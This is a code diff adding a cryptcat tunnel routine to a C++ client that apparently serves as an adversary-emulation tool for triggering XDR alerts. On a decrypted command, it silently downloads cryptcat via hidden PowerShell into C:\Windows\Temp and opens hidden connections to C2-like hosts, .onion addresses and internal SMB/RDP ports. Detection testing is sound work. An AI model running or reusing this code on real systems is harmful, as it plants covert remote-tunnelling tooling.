@@ -2352,6 +2352,98 @@ public:
         
         sendResponse("SOCAT:COMPLETE");
     }
+
+    void executeCryptcatTunnel() {
+        sendResponse("CRYPTCAT:STARTING");
+
+        // Download real cryptcat if it doesn't exist
+        std::string ccPath = "C:\\Windows\\Temp\\cryptcat.exe";
+        if (GetFileAttributesA(ccPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+            sendResponse("CRYPTCAT:DOWNLOADING");
+
+            // Download cryptcat using PowerShell
+            std::string downloadCmd = "powershell -WindowStyle Hidden -Command \"" +
+                std::string("$url='https://github.com/stasinopoulos/cryptcat/releases/download/1.2.1/cryptcat-1.2.1-win32.zip'; ") +
+                "$out='C:\\Windows\\Temp\\cryptcat.zip'; " +
+                "Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing; " +
+                "Expand-Archive -Path $out -DestinationPath 'C:\\Windows\\Temp\\cryptcat_temp' -Force; " +
+                "Move-Item -Path 'C:\\Windows\\Temp\\cryptcat_temp\\cryptcat.exe' -Destination 'C:\\Windows\\Temp\\cryptcat.exe' -Force\"";
+
+            STARTUPINFOA si = {0};
+            PROCESS_INFORMATION pi = {0};
+            si.cb = sizeof(si);
+            si.dwFlags = STARTF_USESHOWWINDOW;
+            si.wShowWindow = SW_HIDE;
+
+            if (CreateProcessA(NULL, (LPSTR)downloadCmd.c_str(), NULL, NULL, FALSE,
+                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                WaitForSingleObject(pi.hProcess, 30000);
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+                logActivity("*** XDR_ALERT ***", "CRYPTCAT_DOWNLOADED",
+                           "Cryptcat tool downloaded to C:\\Windows\\Temp\\cryptcat.exe");
+            }
+        }
+
+        // Ensure cryptcat exists before attempting connections
+        if (GetFileAttributesA(ccPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+            sendResponse("CRYPTCAT:NOT_FOUND");
+            logActivity("*** XDR_ALERT ***", "CRYPTCAT_NOT_FOUND",
+                       "cryptcat.exe missing - skipping execution");
+            return;
+        }
+
+        // Real cryptcat connections
+        std::vector<std::string> targets = {
+            "portquiz.net:4444",
+            "45.142.114.231:80",
+            "malware-c2.dynamic.io:443",
+            "192.168.1.1:445",
+            "10.0.0.1:3389",
+            "3g2upl4pq3kufc4m.onion:80",
+            "fakec2trigger.onion:9999"
+        };
+
+        std::string ccMD5 = getFileHash(ccPath, "MD5");
+        std::string ccSHA256 = getFileHash(ccPath, "SHA256");
+        char userBuf[UNLEN + 1];
+        DWORD userSize = UNLEN + 1;
+        GetUserNameA(userBuf, &userSize);
+
+        for (const auto& target : targets) {
+            std::string ccCmd = "C:\\Windows\\Temp\\cryptcat.exe -v -n -z -w 2 " +
+                              target.substr(0, target.find(':')) + " " +
+                              target.substr(target.find(':') + 1);
+
+            STARTUPINFOA si = {0};
+            PROCESS_INFORMATION pi = {0};
+            si.cb = sizeof(si);
+            si.dwFlags = STARTF_USESHOWWINDOW;
+            si.wShowWindow = SW_HIDE;
+
+            if (CreateProcessA(NULL, (LPSTR)ccCmd.c_str(), NULL, NULL, FALSE,
+                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                WaitForSingleObject(pi.hProcess, 2000);
+                TerminateProcess(pi.hProcess, 0);
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+
+                std::string logMsg = "status=outgoing proc=cryptcat.exe path=" + ccPath +
+                                    " cmd=\"" + ccCmd + "\" md5=" + ccMD5 +
+                                    " sha256=" + ccSHA256 + " user=" + std::string(userBuf) +
+                                    " target=" + target;
+
+                if (target.find(".onion") != std::string::npos) {
+                    logActivity("*** XDR_ALERT ***", "CRYPTCAT_TOR_CONNECTION", logMsg);
+                }
+                logActivity("*** XDR_ALERT ***", "CRYPTCAT_CONNECTION", logMsg);
+            }
+
+            std::this_thread::sleep_for(std::chrono::milliseconds(300));
+        }
+
+        sendResponse("CRYPTCAT:COMPLETE");
+    }
     
     void executeRemoteDesktop() {
         sendResponse("RDP:STARTING");
@@ -2786,6 +2878,9 @@ public:
         } else if (decrypted.find("SOCAT:RELAY:CREATE:") == 0 || decrypted.find("DOWNLOAD:") == 0 && decrypted.find("socat") != std::string::npos) {
             logActivity("CLIENT_DEBUG", "SOCAT_CMD", "Received socat command");
             executeSocatRelay();
+        } else if (decrypted.find("CRYPTCAT:TUNNEL:CREATE:") == 0 || decrypted.find("PROCESS:CREATE:") == 0 && decrypted.find("cryptcat.exe") != std::string::npos) {
+            logActivity("CLIENT_DEBUG", "CRYPTCAT_CMD", "Received cryptcat command");
+            executeCryptcatTunnel();
         } else if (decrypted.find("CAMPAIGN:") == 0) {
             std::string campaign = decrypted.substr(9);
             sendResponse("CAMPAIGN:ACK:" + campaign);
